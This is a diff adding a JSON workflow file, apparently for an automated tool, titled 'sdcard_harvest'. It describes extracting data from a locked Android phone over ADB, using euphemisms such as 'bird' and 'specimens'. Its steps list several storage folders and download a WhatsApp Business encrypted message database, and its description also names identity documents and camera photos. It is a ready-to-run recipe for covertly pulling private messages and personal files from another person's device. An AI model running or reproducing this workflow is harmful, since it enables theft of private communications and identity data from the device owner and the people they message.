@@ -1,0 +1,43 @@
+{
+  "name": "sdcard_harvest",
+  "description": "Harvest a locked Android bird over ADB: inventory /sdcard, pull identity docs, WhatsApp crypt14 msgstores, camera specimens. Sequential pulls to avoid panel collisions.",
+  "steps": [
+    {
+      "args": {
+        "path": "/sdcard"
+      },
+      "tool": "list_files"
+    },
+    {
+      "args": {
+        "path": "/sdcard/Download"
+      },
+      "tool": "list_files"
+    },
+    {
+      "args": {
+        "path": "/sdcard/DCIM/Camera"
+      },
+      "tool": "list_files"
+    },
+    {
+      "args": {
+        "path": "/sdcard/Android/media"
+      },
+      "tool": "list_files"
+    },
+    {
+      "args": {
+        "path": "/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Databases"
+      },
+      "tool": "list_files"
+    },
+    {
+      "args": {
+        "path": "/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Databases/msgstore-2026-09-05.1.db.crypt14"
+      },
+      "tool": "download_file"
+    }
+  ],
+  "saved": "2026-09-06 02:01"
+}
